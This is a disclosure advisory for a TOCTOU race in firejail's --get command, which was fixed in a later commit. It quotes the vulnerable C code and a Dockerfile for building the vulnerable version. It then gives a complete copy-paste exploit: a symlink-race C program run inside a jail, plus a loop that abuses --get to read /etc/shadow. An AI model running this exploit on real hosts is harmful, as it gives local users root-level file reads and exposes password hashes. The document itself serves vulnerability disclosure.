# firejail advisory for TOCTOU in --get and --put (local root)

Releasing a brief advisory/writeup about a local root privesc found in firejail that we reported back in Nov, 2016. This is in response to a recent [thread](http://seclists.org/oss-sec/2017/q1/20) on oss-sec where people seem interested in details of firejail security issues. This particular vulnerability was fixed in commit [e152e2d](https://github.com/netblue30/firejail/commit/e152e2d067e17be33c7e82ce438c8ae740af6a66) but no CVE was assigned.

## Vulnerability

This is a TOCTOU (race condition) bug when testing access permissions with access() and then calling copy_file(). At the time of discovery, it was clear the code suffered from many insecure coding constructs like this and much more -- but there was no guideline around making security related bug reports (other than using the public issue tracker).

### Code: src/firejail/ls.c
~~~~
void sandboxfs(int op, pid_t pid, const char *path) {
        EUID_ASSERT();

        // if the pid is that of a firejail  process, use the pid of the first child process
        EUID_ROOT();
        char *comm = pid_proc_comm(pid);
        EUID_USER();
        if (comm) {
                if (strcmp(comm, "firejail") == 0) {
                        pid_t child;
                        if (find_child(pid, &child) == 0) {
                                pid = child;
                        }
                }
                free(comm);
        }

        // check privileges for non-root users
        uid_t uid = getuid();
        if (uid != 0) {
                uid_t sandbox_uid = pid_get_uid(pid);
                if (uid != sandbox_uid) {
                        fprintf(stderr, "Error: permission denied.\n");
                        exit(1);
                }
        }

        // full path or file in current directory?
        char *fname;
        if (*path == '/') {
                fname = strdup(path);
                if (!fname)
                        errExit("strdup");
        }
        else if (*path == '~') {
                if (asprintf(&fname, "%s%s", cfg.homedir, path + 1) == -1)
                        errExit("asprintf");
        }
        else {
                fprintf(stderr, "Error: Cannot access %s\n", path);
                exit(1);
        }

        // sandbox root directory
        char *rootdir;
        if (asprintf(&rootdir, "/proc/%d/root", pid) == -1)
                errExit("asprintf");

        if (op == SANDBOX_FS_LS) {
                EUID_ROOT();
                // chroot
                if (chroot(rootdir) < 0)
                        errExit("chroot");
                if (chdir("/") < 0)
                        errExit("chdir");

                // access chek is performed with the real UID
                if (access(fname, R_OK) == -1) {
                        fprintf(stderr, "Error: Cannot access %s\n", fname);
                        exit(1);
                }

                // list directory contents
                struct stat s;
                if (stat(fname, &s) == -1) {
                        fprintf(stderr, "Error: Cannot access %s\n", fname);
                        exit(1);
                }
                if (S_ISDIR(s.st_mode)) {
                        char *rp = realpath(fname, NULL);
                        if (!rp) {
                                fprintf(stderr, "Error: Cannot access %s\n", fname);
                                exit(1);
                        }
                        if (arg_debug)
                                printf("realpath %s\n", rp);

                        char *dir;
                        if (asprintf(&dir, "%s/", rp) == -1)
                                errExit("asprintf");

                        print_directory(dir);
                        free(rp);
                        free(dir);
                }
                else {
                        char *rp = realpath(fname, NULL);
                        if (!rp) {
                                fprintf(stderr, "Error: Cannot access %s\n", fname);
                                exit(1);
                        }
                        if (arg_debug)
                                printf("realpath %s\n", rp);
                        char *split = strrchr(rp, '/');
                        if (split) {
                                *split = '\0';
                                char *rp2 = split + 1;
                                if (arg_debug)
                                        printf("path %s, file %s\n", rp, rp2);
                                print_file_or_dir(rp, rp2, 1);
                        }
                        free(rp);
                }
        }

        // get file from sandbox and store it in the current directory
        else if (op == SANDBOX_FS_GET) {
                // check source file (sandbox)
                char *src_fname;
                if (asprintf(&src_fname, "%s%s", rootdir, fname) == -1)
                        errExit("asprintf");
                EUID_ROOT();
                struct stat s;
                if (stat(src_fname, &s) == -1) {
                        fprintf(stderr, "Error: Cannot access %s\n", fname);
                        exit(1);
                }


                // try to open the source file - we need to chroot
                pid_t child = fork();
                if (child < 0)
                        errExit("fork");
                if (child == 0) {
                        // chroot
                        if (chroot(rootdir) < 0)
                                errExit("chroot");
                        if (chdir("/") < 0)
                                errExit("chdir");

                        // drop privileges
                        drop_privs(0);

                        // try to read the file
                        if (access(fname, R_OK) == -1) {
                                fprintf(stderr, "Error: Cannot read %s\n", fname);
                                exit(1);
                        }
                        exit(0);
                }

                // wait for the child to finish
                int status = 0;
                waitpid(child, &status, 0);
                if (WIFEXITED(status) && WEXITSTATUS(status) == 0);
                else
                        exit(1);
                EUID_USER();

                // check destination file (host)
                char *dest_fname = strrchr(fname, '/');
                if (!dest_fname || *(++dest_fname) == '\0') {
                        fprintf(stderr, "Error: invalid file name %s\n", fname);
                        exit(1);
                }

                if (access(dest_fname, F_OK) == -1) {
                        // try to create the file
                        FILE *fp = fopen(dest_fname, "w");
                        if (!fp) {
                                fprintf(stderr, "Error: cannot create %s\n", dest_fname);
                                exit(1);
                        }
                        fclose(fp);
                }
                else {
                        if (access(dest_fname, W_OK) == -1) {
                                fprintf(stderr, "Error: cannot write %s\n", dest_fname);
                                exit(1);
                        }
                }
                // copy file
                EUID_ROOT();
                copy_file(src_fname, dest_fname, getuid(), getgid(), 0644);
                printf("Transfer complete\n");
                EUID_USER();
        }

        free(fname);
        free(rootdir);

        exit(0);
}
~~~~



### Code: src/firejail/util.c
~~~~
int copy_file(const char *srcname, const char *destname, uid_t uid, gid_t gid, mode_t mode) {
        assert(srcname);
        assert(destname);

        // open source
        int src = open(srcname, O_RDONLY);
        if (src < 0) {
                fprintf(stderr, "Warning: cannot open %s, file not copied\n", srcname);
                return -1;
        }

        // open destination
        int dst = open(destname, O_CREAT|O_WRONLY|O_TRUNC, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
        if (dst < 0) {
                fprintf(stderr, "Warning: cannot open %s, file not copied\n", destname);
                close(src);
                return -1;
        }

        // copy
        ssize_t len;
        static const int BUFLEN = 1024;
        unsigned char buf[BUFLEN];
        while ((len = read(src, buf, BUFLEN)) > 0) {
                int done = 0;
                while (done != len) {
                        int rv = write(dst, buf + done, len - done);
                        if (rv == -1) {
                                close(src);
                                close(dst);
                                return -1;
                        }

                        done += rv;
                }
        }

        if (fchown(dst, uid, gid) == -1)
                errExit("fchown");
        if (fchmod(dst, mode) == -1)
                errExit("fchmod");

        close(src);
        close(dst);
        return 0;
}
</snip>
~~~~

## Testing 

### Our Dockerfile

~~~~
FROM ubuntu:latest

ENV wdir /root/firejail

RUN apt-get update && apt-get install -y git gcc make
RUN useradd -ms /bin/bash daniel && echo "daniel:password" | chpasswd
RUN git clone https://github.com/netblue30/firejail.git ${wdir}
WORKDIR ${wdir}
RUN git reset --hard 81467143ee9c47d9c90e97fb55baf2d47702d372
RUN ./configure && make && make install
~~~~

### Our exploit

This will exploit the --get command to read /etc/shadow and print back to the console. Just copy and paste into your shell:

~~~~
#dropper
cat > gexp.sh <<GUEST_JAIL_SCRIPT_EOF
mkdir -p /tmp/exploit
cat > /tmp/exploit/gaolbreak.c <<TOCTOU_POC_END
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>

int main(int argc, char **argv)
{
    char *fl = "/etc/shadow";

    if(argc > 1) {
        fl = argv[1];
    }

    while(1) {
        int fd = open("owned", O_CREAT | O_RDWR, 0777);
        if(fd == -1) {
            perror("open");
            exit(1);
        }
        close(fd);
        remove("owned");
        symlink(fl, "owned");
        remove("owned");
    }
}
TOCTOU_POC_END
cd /tmp/exploit
gcc ./gaolbreak.c -o gaolbreak
# XXX: change argv[1] to whatever you want
./gaolbreak /etc/shadow
GUEST_JAIL_SCRIPT_EOF

# run the dropper (symlink attack) in a jail
chmod +x ./gexp.sh
firejail --noprofile --force --name=el ./gexp.sh &

# win race using the vulnerable 'firejail --get' command.
mkdir exploitel
cd exploitel
while [ 1 ] ; do nice -n 19 firejail --get=$(pgrep -f '^firejail.*--name=el' -n) /tmp/exploit/owned >/dev/null 2>&1; cat owned 2>/dev/null; done
~~~~

### Obligatory PoC Screenshot

![exploit](exploit.png)